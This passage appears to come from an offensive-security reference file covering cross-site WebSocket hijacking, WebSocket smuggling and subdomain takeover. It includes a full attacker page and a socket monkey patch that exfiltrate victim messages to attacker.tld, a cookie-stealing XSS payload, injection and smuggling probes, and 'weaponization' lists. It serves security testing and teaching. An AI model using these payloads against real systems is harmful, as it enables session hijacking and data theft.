          { code: 'Go / Gorilla: upgrader.CheckOrigin = func(r *http.Request) bool { return true }', note: 'The single most common way this ships. Grep server source or open source dependencies for it; it accepts every Origin by design.' },
        ],
      },
      {
        heading: 'Is there anything unpredictable in the handshake?',
        body: [
          'An Origin check is not the only defence and its absence is not the only bug. Look at everything in the handshake and ask which parts an attacker page could not reproduce. The URL query string is fully attacker controllable, so a token in the query is only a defence if the attacker cannot learn it. Cookies are attached automatically, so they defend nothing. The one header a browser page can influence is Sec-WebSocket-Protocol, through the second argument of the WebSocket constructor, which is why an app that puts a per session nonce there is genuinely protected and an app that puts a static string there is not.',
          'Run the same validation tests you would run on a CSRF token: delete the token parameter and reconnect, send it empty, and send a token minted for your own account while carrying the victim cookie. Any of those succeeding means the value is decorative.',
        ],
        examples: [
          { code: 'wss://target.example/socket?token=eyJhbGciOi...   ->  drop the parameter, then send token=, then reuse your own token in another session.', note: 'Three tests that separate a real handshake nonce from a decorative one.' },
          { code: 'new WebSocket("wss://target.example/chat", ["v1.chat", "csrf." + stolenToken])', note: 'The subprotocol list is the only header content a cross-origin page can set, so a nonce placed there is only as strong as your inability to read it.' },
        ],
      },
      {
        heading: 'The cookie preconditions that decide real exploitability',
        body: [
          'The handshake is not a top level navigation, so a cookie that is SameSite=Lax, or that has no SameSite attribute in a browser that defaults to Lax, is not sent from an attacker page on a different site. Be precise about that default, because it is not uniform: Chromium treats a missing attribute as Lax, release Firefox still treats it as None (see the Session Fixation entry for the detail), so a missing-attribute cookie is still cross-site-sendable in Firefox. In Chromium, exploitable CSWSH usually needs SameSite=None, and applications that embed widgets or serve a socket from a separate domain set exactly that.',
          'The trap is that SameSite is site scoped, not origin scoped: the comparison is scheme plus registrable domain. A page on attacker.target.com is same site with target.com, so a Lax cookie is still sent. Any subdomain takeover, any XSS on a forgotten subdomain, and any product feature that gives users their own subdomain reinstates the attack in full even with SameSite=Lax. Do not close a CSWSH lead on a Lax cookie until you have checked for a same site foothold.',
          'Browser posture matters and differs by vendor. Firefox Total Cookie Protection partitions the cookie jar per top level site, so a default Firefox profile usually kills CSWSH even with SameSite=None; if your PoC fails only in Firefox, that is the reason and not a missing bug. Chrome third party cookie blocking has been delayed repeatedly and is not on by default, so a SameSite=None cookie still rides cross site in default Chrome. Test in Chrome, and state the browser in your report.',
          'Loopback and private network targets are a separate case with their own, recently changed, rules. There is still no same origin policy on a loopback socket, and browsers treat loopback URLs as potentially trustworthy so ws://127.0.0.1 is generally not blocked as mixed content from an https page, although behaviour differs between the literal IP and the localhost hostname, so try both. What has changed is the gate in front of it. Chromium replaced Private Network Access with Local Network Access, shipped the permission prompt for fetch, subresources and subframe navigation in Chrome 142, and extended it to WebSocket upgrades in Chrome 147, so on a current Chromium a public page opening a socket to loopback or a private IP now triggers a Local Network Access prompt and fails if the user declines. Do not write up a loopback socket PoC without saying which browser and version you ran it in. Three things still make this live: Firefox and Safari have not shipped an equivalent, so the attack works unprompted there; same address space pages are exempt, so a page served from inside the same private network is not gated; and WebSockets have no equivalent of the fetch targetAddressSpace option, which is why the rollout was staged separately. Desktop launchers, updaters, IDE bridges, mail catchers and dev servers that expose an unauthenticated JSON-RPC socket on a random high port are still the classic victims.',
        ],
        examples: [
          { code: 'Set-Cookie: session=...; Secure; HttpOnly; SameSite=None', note: 'The exploitable shape. Lax or Strict blocks the cross site handshake unless you have a same site foothold.' },
          { code: 'Same site foothold: host the PoC on any *.target.com you control or can XSS; a Lax cookie is still attached.', note: 'SameSite compares registrable domain, so a subdomain is not cross site.' },
          { code: 'async function sweep(){for(let p=20000;p<36000;p++){await new Promise(r=>{const w=new WebSocket("ws://127.0.0.1:"+p+"/");w.onopen=()=>{console.log("open",p);w.close();r()};w.onerror=w.onclose=r})}}', note: 'Browser side port discovery for a local agent socket. Historically Chromium tolerated many failed upgrades while Firefox degraded quickly, but Chromium now prompts for Local Network Access on these upgrades from Chrome 147, so an unprompted sweep needs Firefox, Safari, or a page served from the same address space.' },
        ],
      },
      {
        heading: 'A complete attacker page proof of concept',
        body: [
          'Host this on a domain you control and visit it in a browser that is logged into the target. It opens the socket, replays whatever bootstrap or history request the real client sends, and posts every inbound frame to your collector. Keep the exfiltration as a no-cors POST so it works without any CORS relationship, and log errors too so a failed handshake is distinguishable from a silent socket.',
          'Two details make or break the PoC. First, only the URL and the subprotocol list are under your control, so if the real client negotiates a subprotocol you must pass the same value as the second constructor argument or the server will reject you. Second, send the trigger frame inside onopen, not at top level, because a send before the socket is open throws.',
        ],
        examples: [
          { code: '<!doctype html>\n<html><body><h1>Loading your rewards...</h1>\n<script>\n// Only the URL and the subprotocol list are attacker controllable. Cookies are attached by the browser.\nvar ws = new WebSocket("wss://target.example/chat");\n\n// Read channel: everything the server pushes on the victim session lands here.\nws.onmessage = function (e) {\n  fetch("https://attacker.tld/collect", { method: "POST", mode: "no-cors", body: e.data });\n};\n\n// Write channel: replay whatever the real client sends to make the server dump state.\nws.onopen = function () {\n  ws.send("READY");\n  ws.send(JSON.stringify({ type: "history", limit: 500 }));\n  // Once the schema is known, drive a state change as the victim:\n  // ws.send(JSON.stringify({ type: "updateEmail", email: "attacker@evil.tld" }));\n};\n\nws.onerror = function () {\n  fetch("https://attacker.tld/collect?err=1", { mode: "no-cors" });\n};\n</script>\n</body></html>', note: 'Full CSWSH PoC. The victim sees a normal page; you get their chat history, notification stream, or bootstrap token.' },
          { code: 'new WebSocket("wss://target.example/socket", ["v1.chat"])', note: 'If the real handshake negotiated a subprotocol, pass it or the server closes the connection immediately.' },
          { code: 'const orig = window.WebSocket;\nwindow.WebSocket = function (u, p) {\n  const s = new orig(u, p);\n  s.addEventListener("message", e => fetch("https://attacker.tld/s?d=" + encodeURIComponent(e.data), { mode: "no-cors" }));\n  const send = s.send.bind(s);\n  s.send = d => { fetch("https://attacker.tld/c?d=" + encodeURIComponent(d), { mode: "no-cors" }); return send(d); };\n  return s;\n};', note: 'Different scenario: when you already have XSS on the target origin, monkey patch the constructor to mirror both directions of the real client socket instead of opening your own.' },
        ],
      },
      {
        heading: 'When authentication happens in the first message, not the handshake',
        body: [
          'A common design accepts an anonymous upgrade and then expects the client to send an auth frame such as {"type":"auth","token":"..."}. Developers often present this as the fix for CSWSH, and for the cookie hijack specifically it usually is, because a bearer token in local storage is not attached automatically and an attacker page cannot read it cross origin. What it actually does is move the problem, so test the new shape rather than accepting the claim.',
          'First, the socket is now reachable pre auth by anyone, from any origin, with no victim required. Enumerate what the server will answer before the auth frame arrives: many implementations register every message handler at connect time and only gate a subset. Anything that responds pre auth is unauthenticated attack surface.',
          'Second, check what the auth frame actually proves. If it carries a user id, tenant id, subscriber id or client id alongside the token, try swapping just that field and keeping your own token, which is IDOR on the socket handshake (see the IDOR entry). If it carries only an identifier and no secret, you can simply claim to be another user.',
          'Third, check re authorization per message. Servers frequently bind an identity to the connection at auth time and then trust it forever, so a subscribe or join frame naming another user room, channel or topic is often honoured with no further check. On a broker protocol, try wildcard topics.',
          'Fourth, race the gate. If the auth handler is asynchronous, fire a privileged frame immediately after the auth frame on the same connection and see whether it is processed while the identity is still being resolved (see the Race Condition entry for how to drive this at volume).',
          'Finally, check whether the token the client sends was itself read from a cookie by JavaScript. If it was, the cookie is not HttpOnly, and any XSS on the origin, or a same site page you control, gets you back to a full hijack.',
        ],
        examples: [
          { code: 'Connect and send nothing. Then send: {"type":"ping"} {"type":"subscribe","channel":"public"} {"type":"getConfig"}', note: 'Map what answers before the auth frame. Pre auth handlers need no cookie, no Origin and no victim.' },
          { code: '{"type":"auth","token":"MY_OWN_TOKEN","userId":"1042"}   ->  resend with "userId":"1"', note: 'Identity supplied next to the credential is the classic socket IDOR.' },
          { code: '{"type":"subscribe","topic":"user/1042/notifications"}  ->  "topic":"user/1/notifications"  ->  "topic":"#"', note: 'Per message authorization is usually thinner than at connect. On MQTT over WebSocket, # and + subscribe to everything.' },
        ],
      },
      {
        heading: 'Spoofing the client inside the handshake headers',
        body: [
          'The handshake is a full HTTP request, so every header based trust decision the application makes is in scope, and from a non browser client you control all of them. Servers that read X-Forwarded-For, X-Real-IP, True-Client-IP or X-Forwarded-Host from the upgrade request to decide rate limits, geo rules, IP allowlists or ban status will believe whatever you put there. PortSwigger builds a whole lab around this: a socket that blocks your IP after an XSS attempt is defeated by spoofing X-Forwarded-For on a fresh handshake.',
          'This also means header injection sinks live in the handshake. If the server logs or reflects a handshake header into an admin view or into a message pushed to other clients, you have a stored injection reachable without ever sending a frame.',
          'In Burp, edit the handshake with the pencil icon next to the WebSocket URL in Repeater, which opens a wizard letting you reconnect, clone the connection, or attach to an existing one with the handshake fully editable. This is also how you recover when a payload kills the socket or the handshake token goes stale mid test.',
        ],
        examples: [
          { code: 'websocat --insecure -H="X-Forwarded-For: 127.0.0.1" -H="Cookie: session=..." --origin https://target.example wss://target.example/chat', note: 'Reconnect from a spoofed source address to shake off an IP block or a per IP rate limit.' },
          { code: 'Burp Repeater -> pencil icon beside the ws URL -> edit handshake -> Reconnect', note: 'Re-issue a modified handshake without losing the message you were working on.' },
        ],
      },
      {
        heading: 'Tunnelling other bugs through the socket',
        body: [
          'A socket is a transport, so every server side bug class reachable through a parameter is reachable through a frame, and frame handlers are routinely written with less validation than the REST endpoints beside them because developers think of the socket as an internal channel. Send the classic probes through the socket rather than the URL.',
          'Stored XSS is the highest value case, because a chat or comment socket delivers your payload straight into other users pages, often through an innerHTML sink with no encoding. Injecting markup into a message that another client renders is the PortSwigger message manipulation lab in one line, and in a support widget it means your payload executes in a support agent session.',
          'Server side injection is equally reachable: send SQL, NoSQL, LDAP or command injection probes in frame fields and watch for the same error, boolean and timing oracles you would use over HTTP (see the SQL Injection, NoSQL Injection and OS Command Injection entries). On a Node backend, a frame is a convenient prototype pollution vector; PortSwigger safe detection sends a __proto__ property and looks for changed behaviour in a later greeting or echo. Timing oracles need care over a socket, because responses are asynchronous and unordered, so correlate by an id you put in the frame rather than by arrival order.',
          'The reason to do this inside the socket tab rather than by re-sending the handshake is that the interesting responses arrive out of band. Burp Repeater WebSocket tab shows both directions and lets you edit and resend any message; Burp Proxy can intercept client to server, server to client, or both, configured in the WebSocket interception rules. WebSocket Turbo Intruder scripts the same thing at volume, with a MatchRegex decorator to filter the noise when one message triggers several responses, and its HTTP middleware exposes a local HTTP endpoint that forwards request bodies as frames so any HTTP based scanner can drive the socket.',
        ],
        examples: [
          { code: '{"message":"<img src=1 onerror=fetch(\'https://attacker.tld/?c=\'+document.cookie)>"}', note: 'Stored XSS into every other client that renders the message. In a support widget this lands in an agent session.' },
          { code: '{"user":"admin\'-- -","room":"1"}   and   {"room":"1 AND (SELECT 1 FROM pg_sleep(5))"}', note: 'The frame is just another parameter; error and timing oracles work the same, but correlate replies by id, not by order.' },
          { code: '{"__proto__":{"initialPacket":"Polluted"}}', note: 'Server side prototype pollution probe on a Socket.IO backend: a changed greeting or echo means you polluted Object.prototype.' },
          { code: 'def queue_websockets(upgrade_request, message):\n    connection = websocket_connection.create(upgrade_request)\n    for i in range(10):\n        connection.queue(message, str(i))', note: 'WebSocket Turbo Intruder skeleton. Switch to the threaded engine for races, since the default engine batches on one connection.' },
        ],
      },
      {
        heading: 'WebSocket proxy endpoints and WebSocket smuggling',
        body: [
          'Two server side WebSocket abuses have nothing to do with the victim browser and are worth checking on any target that speaks WebSocket. The first is a proxy endpoint: paths such as /wsproxy?host=<dst>&port=<dst> upgrade the connection and then relay raw TCP to a destination you name. Once you see 101, that is not a one shot SSRF, it is an interactive read and write tunnel closer to netcat than to a URL fetch, so it reaches protocols an HTTP based SSRF cannot (see the SSRF entry for the fetch style case). This is exactly the SonicWall SMA1000 /wsproxy flaw, CVE-2026-15409, which Rapid7 chained through the tunnel into a localhost Erlang distribution service with a hardcoded cookie for code execution. When testing, try every loopback spelling because filters usually block only some of them, and replay whatever cosmetic parameters the legitimate client sends, since values like serviceType often gate nothing.',
          'The second is WebSocket smuggling, published by 0ang3el, which makes a reverse proxy believe a socket was established when the backend never agreed. In one variant the client sends an upgrade with an invalid Sec-WebSocket-Version; the proxy does not validate the version or the backend status code, the backend answers 426, and the proxy tunnels the connection anyway, so subsequent bytes are plain HTTP requests delivered straight to the backend past every path based rule the proxy enforced. Varnish and Envoy 1.8.0 and earlier were affected by that variant. In a second variant, a POST carrying Upgrade: websocket reaches a backend endpoint that performs an outbound request, and an attacker controlled server answers 101, which is enough to convince NGINX that a socket exists. That second variant needs an SSRF on the backend, so it is a chain, not a one step bug. Both share their trust model with HTTP request smuggling, so read that entry too; the difference is that the desync here is about whether the connection upgraded, not about where a request ends.',
        ],
        examples: [
          { code: 'wss://target.example/wsproxy?host=127.0.0.1&port=6379   then send raw protocol bytes', note: 'A 101 turns the endpoint into a full duplex TCP tunnel to a localhost only service.' },
          { code: 'Loopback spellings to try: 127.0.0.1  localhost  0.0.0.0  ::1  ::ffff:127.0.0.1', note: 'Destination filters commonly block one or two of these and miss the rest.' },
          { code: 'GET /public HTTP/1.1\nHost: target.example\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Version: 1234\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==', note: 'Smuggling probe: an invalid version should make the backend answer 426. If the proxy keeps the connection open, send a request for a blocked path down it.' },
          { code: 'git clone https://github.com/0ang3el/websocket-smuggle.git', note: 'Reference lab environments for both smuggling scenarios; build the technique locally before firing it at a live proxy.' },
        ],
      },
      {
        heading: 'Tools and workflow',
        body: [
          'Burp Suite is the base: it proxies and intercepts WebSocket traffic like HTTP, keeps a WebSockets history, and lets Repeater edit and resend individual messages in either direction as well as edit and replay the handshake. socketsleuth adds interception rules, match and replace, Intruder and AutoRepeater for sockets. WebSocket Turbo Intruder adds Python scripted, high rate fuzzing plus the HTTP middleware bridge, and it can also be driven headless.',
          'Outside Burp, wsrepl is an interactive REPL built for pentesting that takes curl style arguments, so you can lift a handshake from Burp or the browser devtools and reconnect in one command, and its plugin hooks let you script the auth frame and reshape every message. websocat is the netcat equivalent for raw connections and for standing up a listener. STEWS discovers and fingerprints WebSocket servers and checks for known issues. PyCript-WebSocket handles targets that encrypt frames client side.',
          'Two workflow rules save time. Always reproduce the finding as a hosted HTML page in a real browser before reporting it, because the raw client result only proves what the server accepts and the report will be closed if the cookie never actually rides. And be careful with rate: high volume socket fuzzing opens many connections and malformed frames can genuinely take a server down, so keep it scoped and deliberate.',
        ],
        examples: [
          { code: 'pip install wsrepl\nwsrepl -u wss://target.example/chat -k -O https://attacker.tld -b "session=..." -P auth_plugin.py', note: 'Interactive session with a forged Origin, the victim cookie, and a plugin that sends the auth frame on connect.' },
          { code: 'websocat -t --insecure --origin https://attacker.tld wss://target.example/chat', note: 'Raw text mode client for quick manual framing.' },
          { code: 'websocat -s 0.0.0.0:8000', note: 'Stand up a listener, useful as the 101 answering server in the second smuggling scenario or to catch a callback.' },
          { code: 'websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://target.example:8000 -v', note: 'Bridge a listener to the real server to sit in the middle of a plaintext or trust-on-first-use socket and watch both directions.' },
          { code: 'java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>', note: "Headless WebSocket Turbo Intruder run for CI or long fuzzing jobs. Documented in PortSwigger's WebSocket Turbo Intruder research post; the jar is not in the BApp Store install and the repo publishes no releases, so build it from source." },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Ride the victim session directly: the handshake carries their cookie, so the server binds the socket to their account and every frame you send is executed and attributed as them.',
          'Speak as the victim to other people: on a chat, support or collaboration socket your frames arrive in third party clients with the victim name and avatar attached.',
          'Steal a credential off the channel and become the victim everywhere: bootstrap and history frames routinely carry a session token, API key or anti CSRF token, which you replay outside the browser against the whole API rather than just the socket.',
          'Claim an identity outright where auth happens in the first frame and that frame carries a user, tenant or subscriber id next to the credential; swap the id and keep your own token.',
          'Forge a trusted origin against a weak Origin check: a prefix or suffix matching bug is satisfied by a lookalike domain you register, a null allowlist is satisfied by a sandboxed iframe, and any XSS or takeover on a subdomain gives you a genuinely same site page the server trusts.',
          'Spoof the network identity of the client in the handshake headers, since X-Forwarded-For, X-Real-IP and True-Client-IP are attacker set from a non browser client, so IP allowlists, bans and per IP rate limits believe you are an internal or different client.',
          'Present a bearer token from an arbitrary page through Sec-WebSocket-Protocol, the only header content a cross-origin page can set, which is also why tokens placed there leak into proxy and access logs where they can be harvested and replayed.',
          'Impersonate the legitimate desktop client to a local agent: the browser applies no same origin policy to loopback sockets, so a web page can drive a JSON-RPC IPC channel that only expected the vendor app; Chromium now puts a Local Network Access prompt in front of the upgrade from Chrome 147, but Firefox and Safari do not, and a page served from the same address space is exempt everywhere.',
          'Present as the reverse proxy itself through WebSocket smuggling: once the proxy believes a socket exists, the backend receives your requests as though they had passed the front-end trust boundary.',
          'Impersonate the server to the client on a plaintext ws:// socket, which has no server authentication at all, by bridging a listener in front of it.',
        ],
        why: 'Identity on a WebSocket is decided once, at a handshake the attacker page can cause but the server cannot distinguish from the real client, because the browser supplies the credential automatically and the same origin policy never applies; every frame afterwards inherits that one unverified identity decision.',
      },
      information_disclosure: {
        weaponization: [
          "Send the client's own history or bootstrap request, such as a READY or a history frame, and read the victim private messages straight back on the hijacked channel.",
          'Sit on the server push stream and exfiltrate each frame as it arrives: notifications, order flow, captured mail, build logs, telemetry, presence and typing events.',
          'Harvest the connect time bootstrap frame, which commonly contains the full user object, email, internal ids, feature flags and sometimes a session or anti CSRF token.',
          'Subscribe to a channel, room or topic belonging to another user, or to a wildcard topic such as # or + when the socket tunnels MQTT or STOMP, and read every user traffic at once.',
          'Tunnel a server side injection through a frame so the database or directory answers back over the socket, using the same boolean, error and timing oracles as over HTTP.',
          'Use a WebSocket proxy endpoint as a full duplex read primitive into localhost only services, recovering responses that a one shot HTTP SSRF could never read.',
          'Fingerprint the victim local environment from the attacker page by sweeping loopback ports and recording which upgrades survive.',
        ],
        why: 'This is the property that separates the attack from CSRF: WebSockets are outside CORS, so nothing in the browser stops the attacker page reading the response frames, and the socket is bound to a session that is authorized to receive the data.',
      },
      tampering: {
        weaponization: [
          'Drive state changing frames as the victim: change profile or notification settings, post or delete content, place or cancel orders, move funds, accept invitations.',
          'Store XSS in other users through the socket by injecting markup into a message another client renders, which in a support or moderation queue lands inside a staff session.',
          'Modify fields the real client never exposes, such as price, quantity, recipient, role or timestamps, because per frame validation is usually thinner than on the equivalent REST endpoint.',
          'Pollute server side prototypes through a frame on a Node backend, changing behaviour for every subsequent request the process handles.',
          'Write into internal services through a WebSocket proxy tunnel, reaching TCP protocols and administrative commands that never expected an external caller.',
          'Bypass a WAF or request level rate limiter entirely, since after the 101 most inspection stops and the proxy simply relays frames.',
        ],
        why: 'The hijacked channel is bidirectional and already authorized, so any state change the application exposes as a message becomes an attacker write, executed under the victim identity with whatever validation the frame handler happens to do.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Reach handlers that are registered at connect time but only gated for some message types, so a privileged frame is answered before or without authentication.',
          'Call privileged RPC methods on a socket that never authenticates beyond the handshake, the Gitpod pattern where getOwnerToken and addSSHPublicKey were reachable over a hijacked channel and led to code execution in the victim workspace.',
          'Chain a local agent socket into command execution by invoking one method that creates a resource and a second that launches it with attacker supplied arguments, the pattern seen in desktop launcher JSON-RPC channels.',
          'Chain a WebSocket proxy tunnel into a localhost only management service and then to root, as in the SonicWall SMA1000 chain from an unauthenticated tunnel to a path traversal in a privileged maintenance workflow.',
          'Lift an owner, admin or service token out of the frames and use it against the privileged API surface rather than the socket.',
          'Bypass front-end path restrictions through WebSocket smuggling to reach admin endpoints the reverse proxy was configured to block.',
        ],
        why: 'WebSocket handlers are commonly written as an internal channel and inherit authorization from the connection rather than re-checking it per message, so once a connection is established under any identity the per action checks that protect the HTTP API are frequently absent.',
      },
      repudiation: {
        weaponization: [
          'Exploit the fact that most stacks log HTTP requests but not individual frames, so only the 101 handshake appears in the access log and the state changes it carried leave no per action trail.',
          'Hide behind the connection level metadata: because one long lived connection carries every action, the source IP, User-Agent and timestamp recorded against each change are those of the handshake, not of the action.',
          'Spoof the recorded source of the connection at handshake time with X-Forwarded-For or True-Client-IP where the application logs the forwarded value, so even the connection record points somewhere else.',
        ],
        why: 'Auditing is usually built around HTTP requests while the socket carries the actions, so a hijacked channel produces changes that are either attributed to the innocent session owner or not individually recorded at all.',
      },
      denial_of_service: {
        weaponization: [
          'Exhaust the victim per user connection quota from the attacker page by opening many concurrent sockets on their session, so the real client cannot connect.',
          'Degrade or hang the victim browser from a hostile page by sweeping loopback ports, since browsers handle a few hundred failed upgrades in quick succession with varying grace; measure it on the build in front of you rather than naming a vendor.',
          'Send a malformed frame whose header declares a payload length near the maximum integer with no body, so a server that trusts the declared length preallocates and runs out of memory; this needs a raw client, since the browser API will not build the frame.',
          'Flood the message handler on a long lived connection, where per request rate limiting no longer applies because there is only one request.',
        ],
        why: 'The socket is a long lived, per user resource that most rate limiting is blind to once the upgrade completes, so both the connection slot and the frame handler can be starved; for general resource exhaustion patterns see the Application Denial of Service entry.',
      },
    },
  },

  {
    id: 'subdomain-takeover',
    name: 'Subdomain Takeover',
    summary: 'Claim the third party resource or DNS namespace that a leftover record still points at, so an attacker controlled server answers for a hostname inside the target domain.',
    tags: ['dns', 'infrastructure', 'trust-boundary'],
    executionContext: {
      where: 'In DNS resolution, then on the attacker owned server or vendor tenant that now answers for a hostname inside the victim domain.',
      detail: 'Nothing runs on the victim application. The flaw lives in the organisation DNS zone, in a record that outlived the resource it named, but the effect executes somewhere else entirely: at the resolver, which keeps handing out an answer for a name the organisation no longer controls, and at the third party service or cloud host where the attacker claimed that name and now serves content and TLS under it. The consequences then execute in a third place, the victim browser, which treats the claimed host as part of the same registrable domain and therefore attaches domain scoped cookies to it, honours CORS, CSP and OAuth allow lists written as a domain suffix, and counts it as same-site. In the NS delegation variant the attacker nameserver itself becomes authoritative, so the DNS answers for the whole delegated namespace are produced on attacker hardware. Note the boundary this creates: with a CNAME claim you control HTTP content at exactly one hostname, not the zone, so you cannot publish MX, TXT or SPF records for it. Only zone level control gives you that.',
    },
    howTo: [
      {
        heading: 'Root cause: the record outlives the resource',
        body: [
          'Provisioning order is the whole bug. Someone creates a bucket, a Pages site, a helpdesk, a status page or a load balancer, points a DNS record at the vendor hostname, and later deletes the vendor side resource while the DNS record stays. The name still resolves, but the thing it names is gone and the vendor namespace it lived in is open to whoever asks next. Claim that name at the vendor and every request for the company hostname arrives at your tenant.',
          'The reason this matters more than a defaced marketing page is that the entire web trust model is keyed on names. Cookie scope, CORS allow lists, CSP source lists, OAuth redirect registrations, SPF authorisation and same-site classification all authorise by hostname or by registrable domain, not by who actually operates the box. Acquiring a name inside the namespace inherits the trust that was granted to the organisation.',
          'The correct lifecycle is the inverse of how it usually happens: the DNS record should be the last step of provisioning and the first step of decommissioning, and the parent side delegation should be removed and allowed to expire from caches before the provider zone is deleted.',
        ],
      },
      {
        heading: 'Where to look: the record shapes and where the names come from',
        body: [
          'Three record shapes are worth your time. A CNAME pointing at a vendor hostname is the common one and the easiest to claim. An A or AAAA record pointing at a cloud IP that was released back to the provider pool is real but expensive to exploit. An NS record delegating a zone or subzone to a provider that no longer has that zone is the worst case, because it hands over every name underneath it.',
          'Also check ALIAS and ANAME records at apexes, MX records pointing at a dead mail vendor, SRV records, and TXT records that carry an SPF include of a domain that is no longer registered. Multi hop CNAME chains matter too: the first hop can be healthy while the second or third is claimable, and tools that only inspect one hop miss it.',
          'Build the name list from certificate transparency, passive DNS and brute force, and specifically look for names that used to exist. Historical DNS is where the good candidates hide, because an old CNAME tells you which vendor the company used to use, and forgotten vendors are exactly the ones nobody monitors.',
        ],
        examples: [
          { code: 'subfinder -d example.com -all -silent -o subs.txt', note: 'Passive plus all sources. Feed the result into resolution rather than trusting that these names are live.' },
          { code: "curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | sort -u", note: 'Certificate transparency names, including hosts that were decommissioned but still have a logged certificate. Strip the leading star from wildcard entries.' },
          { code: 'dnsx -l subs.txt -recon -json -silent -o records.json', note: 'Pull A, AAAA, CNAME, NS, TXT, SRV, MX and SOA in one pass so you can classify records instead of only probing HTTP.' },
          { code: 'Historical sources: SecurityTrails, VirusTotal passive DNS, Censys, Shodan, Chaos.', note: 'Old CNAME targets name the vendors that were dropped, which is where the unclaimed tenants are.' },
        ],
      },
      {
        heading: 'Detect: resolve, classify the failure, then fingerprint',
        body: [
          'Detection is a two stage funnel and the first stage is DNS, not HTTP. Query the record type directly, then query A on the same name and read the status line. If a CNAME exists but the A lookup for the name returns NXDOMAIN, the alias target does not exist at all: the answer section still shows the CNAME while the rcode reports the failure of the final name in the chain. That is the strongest single signal, and it is the class of finding that pure HTTP fingerprint scanners cannot see, because there is nothing listening to fetch a body from.',
          'The other class resolves fine and returns HTTP, so you fingerprint the body. Fetch over both http and https, follow redirects, and read the vendor error page. Match it against the known vendor signatures, but treat the match as a lead and not a verdict. Also read the TLS certificate: a vendor default or mismatched certificate on a company hostname is a strong hint that the routing is generic and the tenant is gone.',
          'Reproduce by Host header when the vendor routes by name, because that proves the vendor is deciding based on the hostname you send and has no configuration for it. And check for a wildcard first: if the parent zone has a wildcard record, every name you test appears to resolve and the whole scan turns into false positives.',
        ],
        examples: [
          { code: 'dig assets.example.com CNAME +short', note: 'Read the alias. If the target is a vendor hostname, note the vendor and the exact target name.' },
          { code: 'dig assets.example.com A +noall +comments +answer', note: 'status: NXDOMAIN with a CNAME still in the answer section is a dangling alias to a target that does not exist.' },
          { code: 'dnsx -l subs.txt -a -rcode nxdomain,servfail,refused -resp -silent', note: 'Bulk classify by response code. NXDOMAIN suggests a dead alias target, SERVFAIL or REFUSED suggests a broken delegation.' },
          { code: 'dnsx -l subs.txt -cname -resp -silent | grep -Ei "s3|azurewebsites|cloudapp|github.io|herokuapp|ghost.io|surge.sh|readme.io"', note: 'Bucket the survivors by vendor so you can apply the right claiming procedure per vendor.' },
          { code: 'httpx -l subs.txt -sc -title -cname -td -silent', note: 'Status, title, CNAME and technology in one line. Titles like the vendor 404 are your fingerprint shortlist.' },
          { code: 'curl -sik https://assets.example.com/ | head -40', note: 'Read the body and the certificate together. -k because a mismatched vendor certificate is itself evidence.' },
          { code: 'curl -sik -H "Host: assets.example.com" https://<vendor-edge-ip>/', note: 'Proves the vendor edge routes by Host and holds no configuration for this name.' },
          { code: 'dig randomstring12345.example.com A +short', note: 'Wildcard check. If a name you invented resolves, every takeover signal in the zone needs re-reading.' },
        ],
      },
      {
        heading: 'Vendor by vendor reality: verify the current status, do not trust the list',
        body: [
          'can-i-take-over-xyz is the reference for vendor fingerprints and it is the right starting point, but it is explicitly a guide and not an oracle. Its own disclaimer says the authors take no responsibility for correctness and that proving exploitability is the researcher job. Vendors change: several services that were the textbook examples for years now require domain ownership verification, and a page that says the site is missing is not the same as a namespace that will accept your claim.',
          'These are the statuses recorded in that project at the time of writing, which is exactly how you should read them, as a snapshot. Marked vulnerable: AWS S3 with the body about the specified bucket not existing, AWS Elastic Beanstalk and Microsoft Azure services where the signature is NXDOMAIN rather than a page, Bitbucket, Ghost, WordPress.com, Readme.io, Pantheon, Help Scout, Strikingly, Surge.sh, Ngrok, Uptime Robot, JetBrains YouTrack InCloud. Marked edge case, meaning it depends on the exact configuration: GitHub Pages, Heroku, Shopify, Netlify, Vercel, Webflow, Wix, Tumblr, Intercom. Marked not vulnerable: CloudFront, Fastly, Zendesk, Atlassian Statuspage, GitLab Pages, Google Cloud Storage, Squarespace, Firebase, Mailchimp, UserVoice, AWS Elastic Load Balancer.',
          'Two of those deserve a note because the folklore is out of date. The classic cookie theft case that everyone cites, ping.ubnt.com, was a CNAME to an unclaimed CloudFront distribution, and CloudFront no longer allows an alternate domain name to be claimed that way. GitHub Pages moved from freely claimable to an edge case once organisations could verify a domain: a TXT record under a name of the form _github-pages-challenge-ORG reserves the domain and its immediate subdomains so only that account can publish Pages there. GitHub warns that a wildcard DNS record defeats it for deeper names such as b.a.example.com, which is worth testing.',
        ],
        examples: [
          { code: 'AWS S3:  "The specified bucket does not exist"', note: 'Claim by creating a bucket whose name matches the CNAME target exactly, in the matching region for a website endpoint.' },
          { code: 'Azure / Elastic Beanstalk:  NXDOMAIN on the vendor hostname', note: 'There is no page to fingerprint. Detection is purely the DNS response, and the claim is registering the vendor side name.' },
          { code: 'GitHub Pages:  "There isn\'t a GitHub Pages site here."', note: 'Edge case. Verified domains and the CNAME file both matter, so test rather than assume.' },
          { code: 'Heroku:  "No such app"', note: 'Edge case. Heroku has tightened claiming of custom domains, so the error page alone proves nothing.' },
          { code: 'Fastly:  "Fastly error: unknown domain:"   Zendesk:  "Help Center Closed"', note: 'Both recorded as not vulnerable. These are the classic false positive generators in automated output.' },
          { code: 'Statuspage, GitLab Pages:  vendor requires DNS verification before serving a custom domain', note: 'Ownership verification is the fix that actually closes a vendor namespace. Look for it before reporting.' },
        ],
      },
      {
        heading: 'Prove it is claimable, because an error page is not a finding',
        body: [
          'The single most common rejected report in this class is a dangling CNAME with a vendor 404 attached, where the vendor will not actually let anyone else claim the name. The distinction to make explicitly is between a service that returns an error page and a service that will accept a registration for that hostname. Go and try to register it, in your own account, at the vendor.',
          'Demonstrate it discreetly. The guidance from can-i-take-over-xyz is to serve a harmless file at a random unguessable path and to leave the index page alone, because you are proving control, not seizing a brand. A single HTML comment containing your handle is enough, and it gives the triager something to fetch.',
          'For zone level claims the proof is a DNS record, not a web page, and the risk is different: creating the zone at the provider can start answering for production names, so publish only an authorised random TXT record and only with explicit permission. Take screenshots and the exact timestamps, then release the resource once triage confirms, since holding a company hostname longer than needed is its own problem.',
